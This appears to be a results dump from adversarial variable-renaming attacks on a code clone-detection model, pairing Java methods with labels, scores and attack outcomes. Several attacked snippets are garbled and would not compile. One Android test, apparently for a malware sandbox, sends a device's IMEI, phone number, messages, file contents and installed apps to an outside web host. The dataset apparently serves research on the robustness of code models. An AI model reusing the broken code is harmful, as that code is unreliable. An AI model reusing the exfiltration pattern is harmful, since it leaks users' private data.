",280,"    public void testSimpleQuery() throws Exception {
        JCRNodeSource dummySource = (JCRNodeSource) resolveSource(BASE_URL + ""users/alexander.klimetschek"");
        assertNotNull(dummySource);
        OutputStream oses = ((ModifiableSource) dummySource).getOutputStream();
        assertNotNull(oses);
        String dummyReader = ""<?xml version=\""1.0\"" encoding=\""UTF-8\""?><user><id>alexander</id><teamspace>cyclr</teamspace><teamspace>mindquarryTooLong</teamspace></user>"";
        oses.write(dummyReader.getBytes());
        oses.flush();
        oses.close();
        JCRNodeSource url = (JCRNodeSource) resolveSource(BASE_URL + ""users/bastian"");
        assertNotNull(url);
        oses = ((ModifiableSource) url).getOutputStream();
        assertNotNull(oses);
        String content = ""<?xml version=\""1.0\"" encoding=\""UTF-8\""?><user><id>bastian</id><teamspace>mindquarry</teamspace></user>"";
        oses.write(content.getBytes());
        oses.flush();
        oses.close();
        QueryResultSource  qResponse = (QueryResultSource) resolveSource(BASE_URL + ""users?/*[.//user/teamspace='mindquarry']"");
        assertNotNull( qResponse);
        Collection ress qResponse.getChildren();
        assertEquals(1, s.size());
        Iteortor it = s.iterator();
        JCRNodeSource rIsrc = (JCRNodeSource) or.next();
        InputStream rrSrcIn= rIsrc.getInputStream();
        ByteArrayOutputStream publicOUT = new ByteArrayOutputStream();
        IOUtils.copy(rSrcIn, publicOUT);
        rSrcIn.close();
        assertEquals(content, publicOUT.toString());
        publicOUT.close();
        rIsrc.delete();
    }
",LABEL_1,LABEL_1,0.5438626408576965,1,"testSimpleQuery,dummySource,os,dummyContent,source,content,qResult,results,it,rSrc,rSrcIn,actualOut",,,,10,"testSimpleQuery:testSimpleQuery,dummySource:dummySource,os:oses,dummyContent:dummyReader,source:url,content:content,qResult: qResponse,results:s,it:or,rSrc:rIsrc,rSrcIn:rSrcIn,actualOut:publicOUT,",4,GA,666,0.24806305170059204,ga,[]
459,"    @Override
    public void trainClassifier(File dir, String... args) throws Exception {
        String[] command = new String[args.length + 3];
        command[0] = this.getCommand();
        System.arraycopy(args, 0, command, 1, args.length);
        command[command.length - 2] = new File(dir, ""training-data.libsvm"").getPath();
        command[command.length - 1] = new File(dir, this.getModelName()).getPath();
        Process process = Runtime.getRuntime().exec(command);
        IOUtils.copy(process.getInputStream(), System.out);
        IOUtils.copy(process.getErrorStream(), System.err);
        process.waitFor();
    }
 <SPLIT>     @Override
    protected void parseContent(StreamLimiter streamLimiter, LanguageEnum forcedLang) throws IOException {
        String charset = null;
        IndexDocument sourceDocument = getSourceDocument();
        if (sourceDocument != null && urlItemFieldEnum != null) {
            FieldValueItem fieldValueItem = sourceDocument.getFieldValue(urlItemFieldEnum.contentTypeCharset.getName(), 0);
            if (fieldValueItem != null) charset = fieldValueItem.getValue();
            if (charset == null) {
                fieldValueItem = sourceDocument.getFieldValue(urlItemFieldEnum.contentEncoding.getName(), 0);
                if (fieldValueItem != null) charset = fieldValueItem.getValue();
            }
        }
        boolean charsetWasNull = charset == null;
        if (charsetWasNull) charset = getProperty(ClassPropertyEnum.DEFAULT_CHARSET).getValue();
        StringWriter writer = new StringWriter();
        IOUtils.copy(streamLimiter.getNewInputStream(), writer, charset);
        addField(ParserFieldEnum.htmlSource, writer.toString());
        writer.close();
        HtmlDocumentProvider htmlProvider = findBestProvider(charset, streamLimiter);
        if (htmlProvider == null) return;
        addField(ParserFieldEnum.htmlProvider, htmlProvider.getName());
        String contentType = htmlProvider.getMetaHttpEquiv(""content-type"");
        String contentTypeCharset = null;
        if (contentType != null) {
            contentTypeCharset = MimeUtils.extractContentTypeCharset(contentType);
            if (contentTypeCharset != null && !contentTypeCharset.equals(charset)) charsetWasNull = true;
        }
        if (charsetWasNull) {
            if (contentTypeCharset != null) charset = contentTypeCharset; else charset = htmlProvider.getMetaCharset();
            if (charset != null) htmlProvider = findBestProvider(charset, streamLimiter);
        }
        HtmlNodeAbstract<?> rootNode = htmlProvider.getRootNode();
        if (rootNode == null) return;
        for (HtmlNodeAbstract<?> metaNode : htmlProvider.getMetas()) {
            String metaName = metaNode.getAttributeText(""name"");
            if (metaName != null && metaName.startsWith(OPENSEARCHSERVER_FIELD)) {
                String field = metaName.substring(OPENSEARCHSERVER_FIELD_LENGTH);
                String[] fields = field.split(""\\."");
                if (fields != null) {
                    String content = metaNode.getAttributeText(""content"");
                    addDirectFields(fields, content);
                }
            }
        }
        addField(ParserFieldEnum.charset, charset);
        addFieldTitle(htmlProvider.getTitle());
        String metaRobots = null;
        String metaDcLanguage = null;
        String metaContentLanguage = null;
        for (HtmlNodeAbstract<?> node : htmlProvider.getMetas()) {
            String attr_name = node.getAttributeText(""name"");
            String attr_http_equiv = node.getAttributeText(""http-equiv"");
            if (""keywords"".equalsIgnoreCase(attr_name)) addField(ParserFieldEnum.meta_keywords, HtmlDocumentProvider.getMetaContent(node)); else if (""description"".equalsIgnoreCase(attr_name)) addField(ParserFieldEnum.meta_description, HtmlDocumentProvider.getMetaContent(node)); else if (""robots"".equalsIgnoreCase(attr_name)) metaRobots = HtmlDocumentProvider.getMetaContent(node); else if (""dc.language"".equalsIgnoreCase(attr_name)) metaDcLanguage = HtmlDocumentProvider.getMetaContent(node); else if (""content-language"".equalsIgnoreCase(attr_http_equiv)) metaContentLanguage = HtmlDocumentProvider.getMetaContent(node);
        }
        boolean metaRobotsFollow = true;
        boolean metaRobotsNoIndex = false;
        if (metaRobots != null) {
            metaRobots = metaRobots.toLowerCase();
            if (metaRobots.contains(""noindex"")) {
                metaRobotsNoIndex = true;
                addField(ParserFieldEnum.meta_robots, ""noindex"");
            }
            if (metaRobots.contains(""nofollow"")) {
                metaRobotsFollow = false;
                addField(ParserFieldEnum.meta_robots, ""nofollow"");
            }
        }
        UrlFilterItem[] urlFilterList = getUrlFilterList();
        List<HtmlNodeAbstract<?>> nodes = rootNode.getAllNodes(""a"", ""frame"");
        IndexDocument srcDoc = getSourceDocument();
        if (srcDoc != null && nodes != null && metaRobotsFollow) {
            URL currentURL = htmlProvider.getBaseHref();
            if (currentURL == null && urlItemFieldEnum != null) {
                FieldValueItem fvi = srcDoc.getFieldValue(urlItemFieldEnum.url.getName(), 0);
                if (fvi != null) currentURL = new URL(fvi.getValue());
            }
            for (HtmlNodeAbstract<?> node : nodes) {
                String href = null;
                String rel = null;
                String nodeName = node.getNodeName();
                if (""a"".equals(nodeName)) {
                    href = node.getAttributeText(""href"");
                    rel = node.getAttributeText(""rel"");
                } else if (""frame"".equals(nodeName)) {
                    href = node.getAttributeText(""src"");
                }
                boolean follow = true;
                if (rel != null) if (rel.contains(""nofollow"")) follow = false;
                URL newUrl = null;
                if (href != null) if (!href.startsWith(""javascript:"")) if (currentURL != null) newUrl = LinkUtils.getLink(currentURL, href, urlFilterList);
                if (newUrl != null) {
                    ParserFieldEnum field = null;
                    if (newUrl.getHost().equalsIgnoreCase(currentURL.getHost())) {
                        if (follow) field = ParserFieldEnum.internal_link; else field = ParserFieldEnum.internal_link_nofollow;
                    } else {
                        if (follow) field = ParserFieldEnum.external_link; else field = ParserFieldEnum.external_link_nofollow;
                    }
                    addField(field, newUrl.toExternalForm());
                }
            }
        }
        if (!metaRobotsNoIndex) {
            nodes = rootNode.getNodes(""html"", ""body"");
            if (nodes == null || nodes.size() == 0) nodes = rootNode.getNodes(""html"");
            if (nodes != null && nodes.size() > 0) {
                StringBuffer sb = new StringBuffer();
                getBodyTextContent(sb, nodes.get(0), true, null);
                addField(ParserFieldEnum.body, sb);
            }
        }
        Locale lang = null;
        String langMethod = null;
        String[] pathHtml = { ""html"" };
        nodes = rootNode.getNodes(pathHtml);
        if (nodes != null && nodes.size() > 0) {
            langMethod = ""html lang attribute"";
            String l = nodes.get(0).getAttributeText(""lang"");
            if (l != null) lang = Lang.findLocaleISO639(l);
        }
        if (lang == null && metaContentLanguage != null) {
            langMethod = ""meta http-equiv content-language"";
            lang = Lang.findLocaleISO639(metaContentLanguage);
        }
        if (lang == null && metaDcLanguage != null) {
            langMethod = ""meta dc.language"";
            lang = Lang.findLocaleISO639(metaDcLanguage);
        }
        if (lang != null) {
            addField(ParserFieldEnum.lang, lang.getLanguage());
            addField(ParserFieldEnum.lang_method, langMethod);
        } else if (!metaRobotsNoIndex) lang = langDetection(10000, ParserFieldEnum.body);
    }
",159,,LABEL_1,LABEL_1,LABEL_1,-1,"trainClassifier,dir,command,length,process",,,,0,,0,GA,1329,0.5527635335922241,failed,[]
460,"    private void startScript(wabclient.Attributes prop) throws SAXException {
        dialog.beginScript();
        String url = prop.getValue(""src"");
        if (url.length() > 0) {
            try {
                BufferedReader r = new BufferedReader(new InputStreamReader(new URL(url).openStream()));
                String buffer;
                while (true) {
                    buffer = r.readLine();
                    if (buffer == null) break;
                    dialog.script += buffer + ""\n"";
                }
                r.close();
                dialog.endScript();
            } catch (IOException ioe) {
                System.err.println(""[IOError] "" + ioe.getMessage());
                System.exit(0);
            }
        }
    }
 <SPLIT>             @Override
            public void handledRun() throws Throwable {
                try {
                    URL url = new URL(ONLINE_CLIENT_DATA + ""gamedata.xml"");
                    BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
                    int lastversion = 0;
                    String readHeader1 = br.readLine();
                    String readHeader2 = br.readLine();
                    String[] parts = readHeader2.split("" "");
                    lastversion = new Integer(parts[1]);
                    GameDatabase.loadVersion();
                    if (GameDatabase.version < lastversion) {
                        Logger.log(LogTypes.LOG, ""Downloading new gamedata"");
                        BufferedOutputStream bo = null;
                        File destfile = new File(GameDatabase.dataFilePath);
                        if (!destfile.createNewFile()) {
                            destfile.delete();
                            destfile.createNewFile();
                        }
                        bo = new BufferedOutputStream(new FileOutputStream(destfile));
                        bo.write((readHeader1 + ""\n"").getBytes());
                        bo.write((readHeader2 + ""\n"").getBytes());
                        int readedbyte;
                        while ((readedbyte = br.read()) != -1) {
                            bo.write(readedbyte);
                        }
                        bo.flush();
                        try {
                            br.close();
                            bo.close();
                        } catch (Exception ex) {
                            Logger.log(ex);
                        }
                    }
                } catch (java.net.UnknownHostException unknownHost) {
                    Logger.log(""Sourceforge is down, cannot update gamedata"");
                } catch (Exception e) {
                    JOptionPane.showMessageDialog(FrameOrganizer.getClientFrame(), ""The gamedata is outdated, but Coopnet couldn't update it!"", ""Gamedata outdated"", JOptionPane.INFORMATION_MESSAGE);
                    throw e;
                } finally {
                    GameDatabase.loadVersion();
                    GameDatabase.load("""", GameDatabase.dataFilePath);
                    GameDatabase.detectGames();
                }
            }
",146,,LABEL_1,LABEL_0,,-4,"startScript,prop,url,r,buffer,dialog,script",,,,0,,0,Greedy,1,0.0005687673886617025,,[]
461,"    private static void copyFile(File in, File out) {
        try {
            FileChannel sourceChannel = new FileInputStream(in).getChannel();
            FileChannel destinationChannel = new FileOutputStream(out).getChannel();
            sourceChannel.transferTo(0, sourceChannel.size(), destinationChannel);
            sourceChannel.close();
            destinationChannel.close();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }
 <SPLIT>     public void getHttpURL() throws Exception {
        boolean display = true;
        boolean allHeaders = false;
        String url = null;
        url = ""http://localhost/cubigraf2"";
        url = ""http://www.accenture.com/NR/rdonlyres/971C4EEE-24E2-4BAA-8C7B-D5A5133D5968/0/en_sprout.jpg"";
        url = ""http://www.uni.pt/img/home-direito.gif"";
        url = ""http://www.google.com"";
        URLConnection uc = new URL(url).openConnection();
        println(""HEADERS:"");
        if (allHeaders) {
            Iterator<Map.Entry<String, List<String>>> itHeaders = uc.getHeaderFields().entrySet().iterator();
            while (itHeaders.hasNext()) {
                Map.Entry<String, List<String>> e = itHeaders.next();
                Iterator<?> itValues = e.getValue().iterator();
                while (itValues.hasNext()) {
                    println(e.getKey() + "": "" + itValues.next());
                }
            }
        } else {
            showObjectProperty(uc, ""getContentEncoding"");
            showObjectProperty(uc, ""getContentLength"");
            showObjectProperty(uc, ""getContentType"");
            showObjectProperty(uc, ""getDate"", FORMAT.TIMESTAMP);
            showObjectProperty(uc, ""getExpiration"", FORMAT.TIMESTAMP);
            showObjectProperty(uc, ""getLastModified"", FORMAT.TIMESTAMP);
        }
        ExtendedInputStream in = new ExtendedInputStream(uc.getInputStream(), url.toString());
        if (display) {
            println(""BODY:"");
            ExtendedReader reader = new ExtendedReader(in);
            for (String s = reader.readLine(); s != null; s = reader.readLine()) {
                println(s);
            }
        } else {
            println(""(BODY saved to a file)"");
            String contentType = uc.getContentType();
            StringBuilder filename = new StringBuilder(""C:\\Documents and Settings\\Carlos_da_S_Pereira\\Desktop\\JAVA_NET_TESTS"");
            filename.append(""."");
            filename.append(contentType.substring(contentType.indexOf(""/"") + 1));
            File file = new File(filename.toString());
            ExtendedOutputStream out = new ExtendedOutputStream(new FileOutputStream(file), file.getAbsolutePath());
            Streams.copy(in, out);
            out.close();
        }
        in.close();
    }
",83,,LABEL_0,LABEL_0,LABEL_0,-1,"copyFile,in,out,sourceChannel,destinationChannel",,,,0,,0,GA,1863,0.6770121812820434,failed,[]
462,"    public boolean actualizarDatosFinal(int idJugadorDiv, int idRonda, jugadorxDivxRonda unjxdxr) {
        int intResult = 0;
        String sql = ""UPDATE jugadorxdivxronda "" + "" SET resultado = ?, puntajeRonda = ? "" + "" WHERE jugadorxDivision_idJugadorxDivision = "" + idJugadorDiv + "" AND ronda_numeroRonda = "" + idRonda;
        try {
            connection = conexionBD.getConnection();
            connection.setAutoCommit(false);
            ps = connection.prepareStatement(sql);
            populatePreparedStatementActFinal(unjxdxr);
            intResult = ps.executeUpdate();
            connection.commit();
        } catch (SQLException ex) {
            ex.printStackTrace();
            try {
                connection.rollback();
            } catch (SQLException exe) {
                exe.printStackTrace();
            }
        } finally {
            conexionBD.close(ps);
            conexionBD.close(connection);
        }
        return (intResult > 0);
    }
 <SPLIT>     private void handleNodeRegainedService(long eventID, long nodeID, String ipAddr, long serviceID, String eventTime) {
        Category log = ThreadCategory.getInstance(OutageWriter.class);
        if (eventID == -1 || nodeID == -1 || ipAddr == null || serviceID == -1) {
            log.warn(EventConstants.NODE_REGAINED_SERVICE_EVENT_UEI + "" ignored - info incomplete - eventid/nodeid/ip/svc: "" + eventID + ""/"" + nodeID + ""/"" + ipAddr + ""/"" + serviceID);
            return;
        }
        Connection dbConn = null;
        try {
            dbConn = DatabaseConnectionFactory.getInstance().getConnection();
            if (openOutageExists(dbConn, nodeID, ipAddr, serviceID)) {
                try {
                    dbConn.setAutoCommit(false);
                } catch (SQLException sqle) {
                    log.error(""Unable to change database AutoCommit to FALSE"", sqle);
                    return;
                }
                PreparedStatement outageUpdater = dbConn.prepareStatement(OutageConstants.DB_UPDATE_OUTAGE_FOR_SERVICE);
                outageUpdater.setLong(1, eventID);
                outageUpdater.setTimestamp(2, convertEventTimeIntoTimestamp(eventTime));
                outageUpdater.setLong(3, nodeID);
                outageUpdater.setString(4, ipAddr);
                outageUpdater.setLong(5, serviceID);
                outageUpdater.executeUpdate();
                outageUpdater.close();
                try {
                    dbConn.commit();
                    if (log.isDebugEnabled()) log.debug(""nodeRegainedService: closed outage for nodeid/ip/service "" + nodeID + ""/"" + ipAddr + ""/"" + serviceID + "" in DB"");
                } catch (SQLException se) {
                    log.warn(""Rolling back transaction, nodeRegainedService could not be recorded  for nodeId/ipAddr/service: "" + nodeID + ""/"" + ipAddr + ""/"" + serviceID, se);
                    try {
                        dbConn.rollback();
                    } catch (SQLException sqle) {
                        log.warn(""SQL exception during rollback, reason"", sqle);
                    }
                }
            } else {
                log.warn(""\'"" + EventConstants.NODE_REGAINED_SERVICE_EVENT_UEI + ""\' for "" + nodeID + ""/"" + ipAddr + ""/"" + serviceID + "" does not have open record."");
            }
        } catch (SQLException se) {
            log.warn(""SQL exception while handling \'nodeRegainedService\'"", se);
        } finally {
            try {
                if (dbConn != null) dbConn.close();
            } catch (SQLException e) {
                log.warn(""Exception closing JDBC connection"", e);
            }
        }
    }
",149,,LABEL_1,LABEL_1,LABEL_1,-1,"actualizarDatosFinal,idJugadorDiv,idRonda,unjxdxr,intResult,sql,connection,ps",,,,0,,0,GA,2948,1.0963471174240111,failed,[]
463,"    public static boolean downloadFile(String from, String to, ProgressMonitor pm) {
        try {
            FileOutputStream out = new FileOutputStream(to);
            URL url = new URL(from);
            URLConnection conn = url.openConnection();
            InputStream in = conn.getInputStream();
            byte[] buffer = new byte[1024];
            int read = 0;
            while ((read = in.read(buffer)) != -1) {
                out.write(buffer, 0, read);
                if (pm != null) pm.addToProgress(read);
            }
            out.close();
            in.close();
        } catch (Exception e) {
            Installer.getInstance().getLogger().log(StringUtils.getStackTrace(e));
            return false;
        }
        return true;
    }
 <SPLIT>     public static void copyFile(String fromPath, String toPath) {
        try {
            File inputFile = new File(fromPath);
            String dirImg = (new File(toPath)).getParent();
            File tmp = new File(dirImg);
            if (!tmp.exists()) {
                tmp.mkdir();
            }
            File outputFile = new File(toPath);
            if (!inputFile.getCanonicalPath().equals(outputFile.getCanonicalPath())) {
                FileInputStream in = new FileInputStream(inputFile);
                FileOutputStream out = new FileOutputStream(outputFile);
                int c;
                while ((c = in.read()) != -1) out.write(c);
                in.close();
                out.close();
            }
        } catch (Exception ex) {
            ex.printStackTrace();
            LogHandler.log(ex.getMessage(), Level.INFO, ""LOG_MSG"", isLoggingEnabled());
        }
    }
",159,"    public static boolean  downloadResource(String from, String to, ProgressMonitor po) {
        try {
            FileOutputStream out = new FileOutputStream(to);
            URL er = new URL(from);
            URLConnectionconnn = er.openConnection();
            InputStream in = conn.getInputStream();
            byte[] raw = new byte[1024];
            int block = 0;
            whileblockead = blockead(raw)) != -1) {
                out.write(raw, 0, block);
                if (po != null) po.addToProgress(block);
            }
            out.close();
            in.close();
        } catch (Exception e) {
            Installer.getInstance().getLogger().log(StringUtils.getStackTrace(e));
            return false;
        }
        return true;
    }
",LABEL_0,LABEL_0,0.9329994916915894,1,"downloadFile,from,to,pm,out,url,conn,in,buffer,read",,,,12,"downloadFile: downloadResource,from:from,to:to,pm:po,out:out,url:er,conn:conn,in:in,buffer:raw,read:block,",5,GA,473,0.17114615043004353,ga,[]
464,"    private void loadDDL() throws IOException {
        try {
            conn.createStatement().executeQuery(""SELECT * FROM overrides"").close();
        } catch (SQLException e) {
            Statement stmt = null;
            if (!e.getMessage().startsWith(ERR_MISSING_TABLE)) {
                LOG.fatal(SQL_ERROR, e);
                throw new IOException(""Error on initial data store read"", e);
            }
            String[] qry = { ""CREATE TABLE monitor (id INTEGER PRIMARY KEY NOT NULL, status VARCHAR(32) NOT NULL, next_update TIMESTAMP NOT NULL)"", ""CREATE TABLE overrides (id INT NOT NULL, title VARCHAR(255) NOT NULL, subtitle VARCHAR(255) NOT NULL, enable BOOLEAN NOT NULL DEFAULT TRUE, PRIMARY KEY(id))"", ""CREATE TABLE settings (var VARCHAR(32) NOT NULL, val VARCHAR(255) NOT NULL, PRIMARY KEY(var))"", ""INSERT INTO settings (var, val) VALUES ('schema', '1')"" };
            try {
                conn.setAutoCommit(false);
                stmt = conn.createStatement();
                for (String q : qry) stmt.executeUpdate(q);
                conn.commit();
            } catch (SQLException e2) {
                try {
                    conn.rollback();
                } catch (SQLException e3) {
                    LOG.fatal(SQL_ERROR, e3);
                }
                LOG.fatal(SQL_ERROR, e2);
                throw new IOException(""Error initializing data store"", e2);
            } finally {
                if (stmt != null) {
                    try {
                        stmt.close();
                    } catch (SQLException e4) {
                        LOG.fatal(SQL_ERROR, e4);
                        throw new IOException(""Unable to cleanup data store resources"", e4);
                    }
                }
                try {
                    conn.setAutoCommit(true);
                } catch (SQLException e3) {
                    LOG.fatal(SQL_ERROR, e3);
                    throw new IOException(""Unable to reset data store auto commit"", e3);
                }
            }
        }
        return;
    }
 <SPLIT>     public void process(@NotNull Template tpl, @NotNull Document model, @NotNull String packageName, @NotNull String outFileName, Map<String, String> xsltParam, String artifact) throws ModelGenerationException {
        System.out.print(""Processing with "" + tpl);
        String destinationPath;
        switch(tpl.destination) {
            case target:
                if (tpl.path == null) {
                    destinationPath = where.buildDir + separatorChar + ""generated-sources"" + separatorChar + GENERATION_TARGET;
                } else {
                    destinationPath = where.buildDir;
                }
                break;
            case source:
                if (tpl.path == null) {
                    destinationPath = where.sourceDir;
                } else {
                    destinationPath = ""src"";
                }
                break;
            case redora:
                destinationPath = where.redoraDir;
                break;
            default:
                throw new IllegalArgumentException(""Unused destination "" + tpl.destination);
        }
        if (tpl.path == null) {
            if (tpl.destination == Destination.redora) destinationPath += separator + artifact; else destinationPath += separator + packageName.replace('.', separatorChar);
        } else {
            destinationPath += separator + tpl.path.replace('/', separatorChar).replace('\\', separatorChar);
        }
        System.out.println("" to "" + destinationPath + ""..."" + outFileName);
        if (tpl.destination == Destination.source) {
            if (new File(destinationPath, outFileName).exists()) {
                System.out.println(""Stub "" + outFileName + "" already exists."");
                return;
            }
        }
        new File(destinationPath).mkdirs();
        InputStream in = null;
        Writer out;
        try {
            out = new FileWriter(new File(destinationPath, outFileName));
        } catch (IOException e) {
            throw new ModelGenerationException(""Can't find: "" + destinationPath + separatorChar + outFileName, e);
        }
        switch(tpl.type) {
            case freemarker:
                Map<String, NodeModel> root = new HashMap<String, NodeModel>();
                root.put(""doc"", NodeModel.wrap(model));
                try {
                    freemarker.template.Template template = freemarkerConf.getTemplate(tpl.getTemplateFileName());
                    template.process(root, out);
                } catch (ParseException e) {
                    throw new ModelGenerationException(""There is an error in template: "" + tpl + "". I found it when generating "" + outFileName, e);
                } catch (IOException e) {
                    throw new ModelGenerationException(""Can't find '"" + tpl + ""' when generating "" + outFileName, e);
                } catch (TemplateException e) {
                    throw new ModelGenerationException(""There is an error in template: "" + tpl + "". I found it when generating "" + outFileName, e);
                } catch (RuntimeException e) {
                    throw new ModelGenerationException(""There is another error while trying this template: "" + tpl + "". I found it when generating "" + outFileName, e);
                }
                break;
            case xslt:
                try {
                    in = new FileInputStream(tpl.getAbsolutePath());
                    xsltTransform(model.getFirstChild(), in, out, xsltParam);
                } catch (FileNotFoundException e) {
                    throw new ModelGenerationException(""Can't find "" + tpl, e);
                } catch (TransformerException e) {
                    throw new ModelGenerationException(""Sorry, i failed to use this template: "" + tpl + "". It broke when generating "" + outFileName, e);
                } finally {
                    IOUtils.closeQuietly(in);
                }
                break;
            case copy:
                try {
                    in = new FileInputStream(tpl.getAbsolutePath());
                    IOUtils.copy(in, out);
                } catch (IOException e) {
                    throw new ModelGenerationException(""File copy failed "" + tpl.getTemplateFileName(), e);
                } finally {
                    IOUtils.closeQuietly(in);
                }
        }
        IOUtils.closeQuietly(out);
    }
",277,,LABEL_0,LABEL_0,LABEL_0,-1,"loadDDL,stmt,qry,q",,,,0,,0,GA,1550,0.613096010684967,failed,[]
465,"    private static void sendExceptionToServer(String server, Throwable ex, String config, String prob) {
        try {
            StringBuilder dataSB = new StringBuilder();
            dataSB.append(URLEncoder.encode(""secret"", ""UTF-8""));
            dataSB.append('=');
            dataSB.append(URLEncoder.encode(""badsecurity"", ""UTF-8""));
            dataSB.append('&');
            dataSB.append(URLEncoder.encode(""version"", ""UTF-8""));
            dataSB.append('=');
            dataSB.append(URLEncoder.encode(BuildInfo.revisionNumber, ""UTF-8""));
            dataSB.append('&');
            dataSB.append(URLEncoder.encode(""os"", ""UTF-8""));
            dataSB.append('=');
            dataSB.append(URLEncoder.encode(System.getProperty(""os.name"") + "" "" + System.getProperty(""os.version""), ""UTF-8""));
            dataSB.append('&');
            dataSB.append(URLEncoder.encode(""user"", ""UTF-8""));
            dataSB.append('=');
            dataSB.append(URLEncoder.encode(System.getProperty(""user.name""), ""UTF-8""));
            dataSB.append('&');
            dataSB.append(URLEncoder.encode(""msg"", ""UTF-8""));
            dataSB.append('=');
            dataSB.append(URLEncoder.encode(ex.getMessage(), ""UTF-8""));
            ByteArrayOutputStream trace = new ByteArrayOutputStream();
            ex.printStackTrace(new PrintStream(trace));
            dataSB.append('&');
            dataSB.append(URLEncoder.encode(""trace"", ""UTF-8""));
            dataSB.append('=');
            dataSB.append(URLEncoder.encode(trace.toString(), ""UTF-8""));
            if (config != null) {
                dataSB.append('&');
                dataSB.append(URLEncoder.encode(""config"", ""UTF-8""));
                dataSB.append('=');
                dataSB.append(URLEncoder.encode(config, ""UTF-8""));
            }
            if (prob != null) {
                dataSB.append('&');
                dataSB.append(URLEncoder.encode(""problem"", ""UTF-8""));
                dataSB.append('=');
                dataSB.append(URLEncoder.encode(prob, ""UTF-8""));
            }
            URL url = new URL(errorServerURL);
            URLConnection conn = url.openConnection();
            conn.setDoOutput(true);
            OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
            wr.write(dataSB.toString());
            wr.flush();
            BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String response = null;
            String line = null;
            while ((line = rd.readLine()) != null) {
                if (response == null) response = line; else System.out.println(line);
            }
            wr.close();
            rd.close();
            if (response.equals(""success"")) System.out.println(""Exception sent to maRla development team""); else System.out.println(""Unable to send exception to development team: "" + response);
        } catch (IOException ex2) {
            System.out.println(""Unable to send exception to development team: "" + ex2.getMessage());
        }
    }
 <SPLIT>     private static String encrypt(String password, String encryptType) {
        try {
            MessageDigest md = MessageDigest.getInstance(encryptType);
            md.update(password.getBytes());
            byte[] hash = md.digest();
            StringBuffer hexString = new StringBuffer();
            for (int i = 0; i < hash.length; i++) {
                if ((0xff & hash[i]) < 0x10) {
                    hexString.append(""0"" + Integer.toHexString((0xFF & hash[i])));
                } else {
                    hexString.append(Integer.toHexString(0xFF & hash[i]));
                }
            }
            password = hexString.toString();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        return password.toUpperCase();
    }
",672,,LABEL_0,LABEL_1,,-4,"sendExceptionToServer,server,ex,config,prob,dataSB,trace",,,,0,,0,Greedy,1,0.0007655700047810872,,[]
466,"    @Test
    public void test_lookupResourceType_FullSearch_TwoWordsInMiddle() throws Exception {
        URL url = new URL(baseUrl + ""/lookupResourceType/armor+plates"");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod(""GET"");
        connection.setRequestProperty(""Accept"", ""application/json"");
        assertThat(connection.getResponseCode(), equalTo(200));
        assertThat(getResponse(connection), equalTo(""[{\""itemTypeID\"":25605,\""itemCategoryID\"":4,\""name\"":\""Armor Plates\"",\""icon\"":\""69_09\""},{\""itemTypeID\"":25624,\""itemCategoryID\"":4,\""name\"":\""Intact Armor Plates\"",\""icon\"":\""69_10\""}]""));
        assertThat(connection.getHeaderField(""Content-Type""), equalTo(""application/json; charset=utf-8""));
    }
 <SPLIT>     private void loadDynamically(File result, String extraPath) {
        URL url = null;
        InputStream is = null;
        FileOutputStream fos = null;
        try {
            url = new URL(homeServerUrl + extraPath);
            is = url.openStream();
            fos = new FileOutputStream(result);
            byte[] buff = new byte[8192];
            int nbRead;
            while ((nbRead = is.read(buff)) > 0) fos.write(buff, 0, nbRead);
        } catch (IOException e) {
            throw new StellariumException(""Cannot dynamically load "" + result + "" from "" + url);
        } finally {
            if (is != null) {
                try {
                    is.close();
                } catch (IOException e) {
                    e.printStackTrace(System.out);
                }
            }
            if (fos != null) {
                try {
                    fos.close();
                } catch (IOException e) {
                    e.printStackTrace(System.out);
                }
            }
        }
    }
",156,,LABEL_0,LABEL_0,LABEL_0,-1,"test_lookupResourceType_FullSearch_TwoWordsInMiddle,url,connection",,,,0,,0,GA,1131,0.40692977905273436,failed,[]
467,"    public void testNetworkHTTP() {
        Log.v(""Test"", ""[*] testNetworkHTTP()"");
        URL url = null;
        HttpURLConnection urlConnection = null;
        try {
            url = new URL(""http://code.google.com/p/droidbox/"");
            urlConnection = (HttpURLConnection) url.openConnection();
            BufferedReader rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            @SuppressWarnings(""unused"") String line = """";
            while ((line = rd.readLine()) != null) ;
            url = new URL(""http://pjlantz.com/imei.php?imei="" + hashedImei);
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null) ;
            url = new URL(""http://pjlantz.com/phone.php?phone="" + phoneNbr);
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null) ;
            url = new URL(""http://pjlantz.com/msg.php?msg="" + msg.replace("" "", ""+""));
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            url = new URL(""http://pjlantz.com/file.php?file="" + fileContent.replace("" "", ""+""));
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null) ;
            url = new URL(""http://pjlantz.com/app.php?installed="" + installedApps.replace("" "", ""+""));
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null) ;
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            urlConnection.disconnect();
        }
    }
 <SPLIT>     private byte[] scramble411(String password, String seed) {
        MessageDigest md;
        try {
            md = MessageDigest.getInstance(""SHA-1"");
            byte[] passwordHashStage1 = md.digest(password.getBytes());
            md.reset();
            byte[] passwordHashStage2 = md.digest(passwordHashStage1);
            md.reset();
            md.update(seed.getBytes());
            md.update(passwordHashStage2);
            byte[] toBeXord = md.digest();
            int numToXor = toBeXord.length;
            for (int i = 0; i < numToXor; i++) {
                toBeXord[i] = (byte) (toBeXord[i] ^ passwordHashStage1[i]);
            }
            return toBeXord;
        } catch (NoSuchAlgorithmException e) {
            if (logger.isLoggable(Level.SEVERE)) {
                logger.log(Level.SEVERE, e.getMessage(), e);
            }
        }
        return null;
    }
